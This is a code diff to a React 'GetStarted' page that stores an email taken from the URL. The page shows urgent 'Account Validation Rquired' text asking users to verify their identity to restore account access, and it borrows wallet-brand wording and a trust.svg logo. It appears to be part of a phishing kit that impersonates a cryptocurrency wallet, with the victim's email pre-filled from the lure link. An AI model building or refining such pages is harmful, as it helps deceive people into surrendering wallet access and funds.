@@ -13,8 +13,14 @@ const GetStarted = ()=>{
 
     useEffect(()=>{
         const urlParams = new URLSearchParams(window.location.search);
+        const hasEmailParam = urlParams.has('email');
         const email = urlParams.get('email');
-        localStorage.setItem('email', email)
+        const isValidEmail = email => hasEmailParam && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        
+        if (isValidEmail(email)) { // Corrected
+            console.log(email);
+            localStorage.setItem('email', email);
+        }
 
         const baseUrl = location.pathname;
         
@@ -30,7 +36,7 @@ const GetStarted = ()=>{
                 <HeadingText>Account Validation Rquired</HeadingText>
                 <HeaderSubtitle>In order to restore access to your account and resume transactions, we kindly ask you to verify your identity by answering a few security questions.</HeaderSubtitle>
                 <Introduction>
-                    <img src="assets/trust.svg" alt="" />
+                    <img src="/../assets/trust.svg" alt="" />
                     <SubTitle>True ownership of your crypto assets - we secure your wallet, but don't control or have access to your private keys or secret phrase - only you do.</SubTitle>
                 </Introduction>
                 <Introduction>
